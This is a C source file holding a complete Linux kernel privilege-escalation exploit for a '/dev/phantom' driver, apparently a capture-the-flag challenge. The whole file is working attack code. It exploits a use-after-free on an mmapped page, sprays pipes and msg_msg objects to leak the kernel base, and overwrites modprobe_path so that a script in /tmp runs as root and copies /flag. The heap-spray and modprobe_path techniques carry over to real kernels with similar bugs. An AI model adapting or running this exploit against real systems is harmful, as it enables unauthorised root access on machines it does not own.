#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <unistd.h>

#define DEV_PATH "/dev/phantom"

#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702

#define PIPE_SPRAY 0x80

uint8_t *uaf;
int pipefd[PIPE_SPRAY][2];
off_t offset = 1;
unsigned long kbase, modprobe;
int qid[0x80];
struct {
    long mtype;
    char mtext[0xc0-0x30];
} msg_buf = {
    .mtype = 1,
};

static void die(const char *msg) {
    perror(msg);
    _exit(1);
}

/* ---------------- ioctl wrappers ---------------- */

static int phantom_open(void) {
    int fd = open(DEV_PATH, O_RDWR);
    if (fd < 0) die("open(/dev/phantom)");
    return fd;
}

static void phantom_alloc(int fd) {
    if (ioctl(fd, CMD_ALLOC, 0) != 0) die("ioctl(CMD_ALLOC)");
}

static void phantom_free(int fd) {
    if (ioctl(fd, CMD_FREE, 0) != 0) die("ioctl(CMD_FREE)");
}

/* ---------------- mmap helper ---------------- */

static void *phantom_map_one_page(int fd) {
    size_t len = 0x1000;
    void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) die("mmap");
    return p;
}

/* ---------------- tiny utilities ---------------- */

void dump_buffer(void *buf, int len) {
    printf("\nDumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("Addr[%03d, 0x%03x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j));
        printf(" - 0x");
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j + 8));
        printf(" |");
        for (size_t j = 0; j < 0x10 && i + j < len; j++) {
          unsigned char c = *(unsigned char *)(buf +i + j);
          putchar((c >= 0x20 && c <= 0x7e) ? c : '.');
        }
        printf("|\n");
    }
}

void setup() {
	system("echo -ne '#!/bin/sh\ncat /flag > /tmp/flag' > /tmp/ex");
	system("chmod a+x /tmp/ex");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
	system("chmod a+x /tmp/executeme");
	printf("[+] Modprobe Setup done.\n");
}

int main(void) {
    
    puts("[+] opening device...");
    int fd = phantom_open();

    puts("[+] CMD_ALLOC...");
    phantom_alloc(fd);

    puts("[+] mmap 0x1000...");
    uaf = (uint8_t *)phantom_map_one_page(fd);
    printf("[+] mapped at %p\n", uaf);

    //int passwdfd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    int passwdfd = open("/etc/passwd", O_RDONLY);

    for (int i = 0; i < PIPE_SPRAY; i++) {
       pipe(pipefd[i]);
    }
    puts("[+] CMD_FREE (page returned to allocator, mapping remains!)");
    phantom_free(fd);

    puts("[+] pipe spray...");
    for (int i = 0; i < PIPE_SPRAY; i++) {
       fcntl(pipefd[i][1], F_SETPIPE_SZ, 0x1000*4);   
       splice(passwdfd, &offset, pipefd[i][1], NULL, 1, 0);
    }
    
    //dump_buffer(uaf, 0x400);
    kbase = *(unsigned long *)(uaf + 0xd0) - 0x12203e0;
    printf("[+] kbase = 0x%lx\n", kbase);
    
    puts("[+] close pipe");
    for (int i = 0; i < PIPE_SPRAY/2; i++) {
       close(pipefd[i][0]);
       close(pipefd[i][1]);
    } 
      
    modprobe = kbase + 0x1b3f5c0;
    *(unsigned long *)(uaf + 0x120) = modprobe - 0x30;

    //dump_buffer(uaf, 0x400);

    puts("[+] msg_msg spray...");
    for (int i = 0; i < 0x80; i++) {
      qid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    }
    memset(msg_buf.mtext, 0, 0x90);
    strcpy(msg_buf.mtext, "/tmp/ex");
    for (int i = 0; i < 0x80; i++) {  
      msgsnd(qid[i], &msg_buf, sizeof(msg_buf.mtext), 0);
    }   
    
    //dump_buffer(uaf, 0x400); 

    puts("[+] cat flag using modprobe path");
    setup();
    system("/tmp/executeme");
    system("cat /tmp/flag");
    
    (void)getchar();

    munmap(uaf, 0x1000);
    close(fd);
    return 0;
}

